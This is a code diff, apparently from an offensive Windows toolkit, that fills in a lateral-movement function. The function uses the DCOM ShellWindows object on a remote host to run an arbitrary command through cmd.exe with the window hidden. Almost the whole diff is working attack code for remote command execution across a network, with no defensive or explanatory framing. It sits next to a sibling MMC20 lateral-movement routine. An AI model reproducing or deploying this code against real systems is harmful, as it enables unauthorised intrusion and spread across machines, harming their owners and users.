@@ -572,23 +572,179 @@ BOOL Lateral_DCOM_MMC20(
     return result->success;
 }
 
-// TODO: ShellWindows method
+// exec via ShellWindows -> Document.Application.ShellExecute
 BOOL Lateral_DCOM_ShellWindows(
     const char* target_host,
     const char* command,
     LATERAL_RESULT* result
 ) {
-    // Similar implementation using ShellWindows COM object
-    // ShellWindows -> Item() -> Document.Application.ShellExecute()
+    IDispatch* pShellWindows = NULL;
+    COSERVERINFO server_info = {0};
+    MULTI_QI mqi = {0};
+    HRESULT hr;
     
     if (!result) return FALSE;
     memset(result, 0, sizeof(LATERAL_RESULT));
     
-    // TODO: Implémentation complète
-    snprintf(result->message, sizeof(result->message),
-        "ShellWindows non implémenté - utiliser MMC20");
+    if (!WMI_InitCOM()) {
+        snprintf(result->message, sizeof(result->message), "COM init fail");
+        return FALSE;
+    }
     
-    return FALSE;
+    wchar_t wtarget[256] = {0};
+    if (MultiByteToWideChar(CP_UTF8, 0, target_host, -1, wtarget, 256) == 0) {
+        result->error_code = GetLastError();
+        return FALSE;
+    }
+    server_info.pwszName = wtarget;
+    
+    mqi.pIID = &IID_IDispatch;
+    mqi.pItf = NULL;
+    mqi.hr = S_OK;
+    
+    // ShellWindows distant
+    hr = CoCreateInstanceEx(
+        &CLSID_ShellWindows,
+        NULL,
+        CLSCTX_REMOTE_SERVER,
+        &server_info,
+        1,
+        &mqi
+    );
+    
+    if (FAILED(hr) || FAILED(mqi.hr)) {
+        result->error_code = FAILED(hr) ? hr : mqi.hr;
+        snprintf(result->message, sizeof(result->message),
+            "ShellWindows fail: 0x%08lX", result->error_code);
+        return FALSE;
+    }
+    
+    pShellWindows = (IDispatch*)mqi.pItf;
+    
+    // Item(0) pour obtenir un explorer window
+    DISPID dispid_item;
+    LPOLESTR name_item = L"Item";
+    hr = pShellWindows->lpVtbl->GetIDsOfNames(pShellWindows, &IID_NULL, &name_item, 1,
+                                               LOCALE_USER_DEFAULT, &dispid_item);
+    if (FAILED(hr)) {
+        pShellWindows->lpVtbl->Release(pShellWindows);
+        result->error_code = hr;
+        return FALSE;
+    }
+    
+    VARIANT var_idx, var_window;
+    VariantInit(&var_idx);
+    VariantInit(&var_window);
+    var_idx.vt = VT_I4;
+    var_idx.lVal = 0;
+    
+    DISPPARAMS dp_item = {&var_idx, NULL, 1, 0};
+    hr = pShellWindows->lpVtbl->Invoke(pShellWindows, dispid_item, &IID_NULL,
+                                        LOCALE_USER_DEFAULT, DISPATCH_METHOD,
+                                        &dp_item, &var_window, NULL, NULL);
+    
+    if (FAILED(hr) || var_window.vt != VT_DISPATCH || !var_window.pdispVal) {
+        pShellWindows->lpVtbl->Release(pShellWindows);
+        result->error_code = hr;
+        snprintf(result->message, sizeof(result->message), "no explorer window");
+        return FALSE;
+    }
+    
+    IDispatch* pWindow = var_window.pdispVal;
+    
+    // Document
+    DISPID dispid_doc;
+    LPOLESTR name_doc = L"Document";
+    hr = pWindow->lpVtbl->GetIDsOfNames(pWindow, &IID_NULL, &name_doc, 1,
+                                         LOCALE_USER_DEFAULT, &dispid_doc);
+    if (FAILED(hr)) {
+        pWindow->lpVtbl->Release(pWindow);
+        pShellWindows->lpVtbl->Release(pShellWindows);
+        return FALSE;
+    }
+    
+    VARIANT var_doc;
+    VariantInit(&var_doc);
+    DISPPARAMS dp_empty = {NULL, NULL, 0, 0};
+    hr = pWindow->lpVtbl->Invoke(pWindow, dispid_doc, &IID_NULL,
+                                  LOCALE_USER_DEFAULT, DISPATCH_PROPERTYGET,
+                                  &dp_empty, &var_doc, NULL, NULL);
+    
+    if (FAILED(hr) || var_doc.vt != VT_DISPATCH) {
+        pWindow->lpVtbl->Release(pWindow);
+        pShellWindows->lpVtbl->Release(pShellWindows);
+        return FALSE;
+    }
+    
+    IDispatch* pDoc = var_doc.pdispVal;
+    
+    // Application
+    DISPID dispid_app;
+    LPOLESTR name_app = L"Application";
+    hr = pDoc->lpVtbl->GetIDsOfNames(pDoc, &IID_NULL, &name_app, 1,
+                                      LOCALE_USER_DEFAULT, &dispid_app);
+    if (FAILED(hr)) {
+        pDoc->lpVtbl->Release(pDoc);
+        pWindow->lpVtbl->Release(pWindow);
+        pShellWindows->lpVtbl->Release(pShellWindows);
+        return FALSE;
+    }
+    
+    VARIANT var_app;
+    VariantInit(&var_app);
+    hr = pDoc->lpVtbl->Invoke(pDoc, dispid_app, &IID_NULL,
+                               LOCALE_USER_DEFAULT, DISPATCH_PROPERTYGET,
+                               &dp_empty, &var_app, NULL, NULL);
+    
+    if (FAILED(hr) || var_app.vt != VT_DISPATCH) {
+        pDoc->lpVtbl->Release(pDoc);
+        pWindow->lpVtbl->Release(pWindow);
+        pShellWindows->lpVtbl->Release(pShellWindows);
+        return FALSE;
+    }
+    
+    IDispatch* pApp = var_app.pdispVal;
+    
+    // ShellExecute(cmd, args, dir, operation, show)
+    DISPID dispid_exec;
+    LPOLESTR name_exec = L"ShellExecute";
+    hr = pApp->lpVtbl->GetIDsOfNames(pApp, &IID_NULL, &name_exec, 1,
+                                      LOCALE_USER_DEFAULT, &dispid_exec);
+    
+    if (SUCCEEDED(hr)) {
+        wchar_t wcmd[512] = {0};
+        if (MultiByteToWideChar(CP_UTF8, 0, command, -1, wcmd, 512) > 0) {
+            VARIANT args[5];
+            for (int i = 0; i < 5; i++) VariantInit(&args[i]);
+            
+            // reverse order
+            args[4].vt = VT_BSTR; args[4].bstrVal = SysAllocString(L"cmd.exe");
+            args[3].vt = VT_BSTR; args[3].bstrVal = SysAllocString(wcmd);
+            args[2].vt = VT_BSTR; args[2].bstrVal = SysAllocString(L"");
+            args[1].vt = VT_BSTR; args[1].bstrVal = SysAllocString(L"open");
+            args[0].vt = VT_I4;   args[0].lVal = 0;  // SW_HIDE
+            
+            DISPPARAMS dp = {args, NULL, 5, 0};
+            hr = pApp->lpVtbl->Invoke(pApp, dispid_exec, &IID_NULL,
+                                       LOCALE_USER_DEFAULT, DISPATCH_METHOD,
+                                       &dp, NULL, NULL, NULL);
+            
+            for (int i = 0; i < 5; i++) VariantClear(&args[i]);
+            
+            if (SUCCEEDED(hr)) {
+                result->success = TRUE;
+                snprintf(result->message, sizeof(result->message),
+                    "exec via ShellWindows on %s", target_host);
+            }
+        }
+    }
+    
+    pApp->lpVtbl->Release(pApp);
+    pDoc->lpVtbl->Release(pDoc);
+    pWindow->lpVtbl->Release(pWindow);
+    pShellWindows->lpVtbl->Release(pShellWindows);
+    
+    return result->success;
 }
 
 BOOL Lateral_DCOM_Execute(
